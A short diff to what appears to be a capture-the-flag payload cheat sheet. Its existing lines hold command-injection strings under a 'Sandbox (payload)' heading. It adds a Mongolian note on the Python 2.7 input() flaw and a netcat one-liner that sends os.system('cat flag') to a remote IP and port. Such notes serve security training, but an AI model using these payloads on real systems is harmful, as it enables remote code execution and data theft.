@@ -574,3 +574,9 @@ Sandbox (payload)
 ; ls
 ` ls `
 ```
+
+* `Python`
+	
+	* `2-7 input()` нь python гийн нийтлэг эмзэг байдал бөгөөд python команд ажиллуулж болно.
+	
+	`echo "__import__('os').system('cat flag')" | nc 3.82.213.234 1337`
